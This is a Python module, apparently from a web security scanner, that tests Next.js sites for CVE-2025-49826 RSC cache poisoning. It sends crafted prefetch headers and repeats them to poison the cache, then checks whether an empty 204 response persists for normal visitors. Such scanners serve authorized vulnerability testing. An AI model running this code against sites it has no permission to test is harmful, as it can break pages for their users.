#!/usr/bin/env python3

"""
https://x.com/zhero___/status/1941593504901173250
https://github.com/vercel/next.js/security/advisories/GHSA-67rr-84xm-4c7r
Thanks Wlayzz for the PoC !
"""


from modules.cp_cve.unrisk_page import get_unrisk_page
from utils.style import Colors, Identify
from utils.utils import configure_logger, random, requests, sys

logger = configure_logger(__name__)

# User agent par défaut
DEFAULT_USER_AGENT = (
    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
)


def verify_cache_poisoning(
    uri: str,
    baseline_response: requests.Response,
    poison_response: requests.Response,
    headers: dict,
    s: requests.Session,
) -> str:
    """
    Vérifie si le cache est effectivement empoisonné de manière persistante
    
    Args:
        uri: URL testée
        baseline_response: Réponse baseline sans headers malveillants
        poison_response: Réponse avec headers malveillants
        headers: Headers malveillants utilisés
        s: Session requests
        
    Returns:
        Niveau de confirmation: "confirmed", "behavior++", "behavior", ou None
    """
    # Empoisonnement du cache
    for _ in range(5):
        s.get(
            uri,
            headers=headers,
            verify=False,
            allow_redirects=False,
            timeout=10
        )
    
    # Vérification sans headers malveillants
    req_confirm = s.get(uri, verify=False, allow_redirects=False, timeout=10)
    
    # Vérification stricte: status code 204 persistant
    if (
        req_confirm.status_code == poison_response.status_code
        and req_confirm.status_code != baseline_response.status_code
        and req_confirm.status_code == 204
    ):
        return "confirmed"
    
    # Vérification medium: status code persistant mais pas 204
    elif (
        req_confirm.status_code == poison_response.status_code
        and req_confirm.status_code != baseline_response.status_code
    ):
        return "behavior++"
    
    # Détection basique: changement de status code
    elif req_confirm.status_code != baseline_response.status_code:
        return "behavior"
    
    return None


def nextjs_204(url: str, s: requests.Session) -> None:
    """
    Teste CVE-2025-49826 (Next.js RSC 204 cache poisoning)
    
    Args:
        url: URL cible
        s: Session requests
    """
    # Cache buster pour éviter les faux positifs
    test_url = f"{url}?cve={random.randrange(9999)}"
    
    headers = {
        "User-Agent": DEFAULT_USER_AGENT,
        "Rsc": "1",
        "Next-Router-Prefetch": "1",
        "Next-Router-Segment-Prefetch": "/nonexistent_segment",
    }
    
    try:
        # Requête baseline sans headers malveillants
        req_baseline = s.get(test_url, verify=False, allow_redirects=False, timeout=10)
        
        # Trouver une page sans risque
        unrisk_page = get_unrisk_page(url, s, req_baseline)
        
        if not unrisk_page:
            logger.debug("No risk-free page found for testing")
            return
        
        # URL de test sur la page sans risque
        uri = f"{unrisk_page}?cve={random.randrange(99999)}"
        
        # Requête baseline sur page sans risque
        req = s.get(uri, verify=False, allow_redirects=False, timeout=10)
        
        # Requête avec headers malveillants
        req_poison = s.get(
            uri,
            headers=headers,
            verify=False,
            allow_redirects=False,
            timeout=10
        )
        
        # Ignorer si WAF ou rate limiting
        if req_poison.status_code in [403, 429]:
            return
        
        # Vérifier si le status code change
        if req.status_code != req_poison.status_code:
            # Vérification du cache poisoning
            confirmation_level = verify_cache_poisoning(
                uri,
                req,
                req_poison,
                headers,
                s
            )
            
            if confirmation_level == "confirmed":
                print(
                    f" {Identify.confirmed} | CVE-2025-49826 | {Colors.BLUE}{uri}{Colors.RESET} | "
                    f"{req.status_code} > {req_poison.status_code} (204) | PAYLOAD: {headers}"
                )
            elif confirmation_level == "behavior++":
                print(
                    f" {Identify.behavior} ++ | CVE-2025-49826 | {Colors.BLUE}{uri}{Colors.RESET} | "
                    f"{req.status_code} > {req_poison.status_code} | PAYLOAD: {headers}"
                )
            elif confirmation_level == "behavior":
                print(
                    f" {Identify.behavior} | CVE-2025-49826 | {Colors.BLUE}{uri}{Colors.RESET} | "
                    f"{req.status_code} > {req_poison.status_code} | PAYLOAD: {headers}"
                )
                
    except requests.Timeout as t:
        logger.error(f"Timeout Error: {t}")
    except KeyboardInterrupt:
        print("Exiting")
        sys.exit()
    except Exception as e:
        logger.exception(f"Error testing CVE-2025-49826: {e}")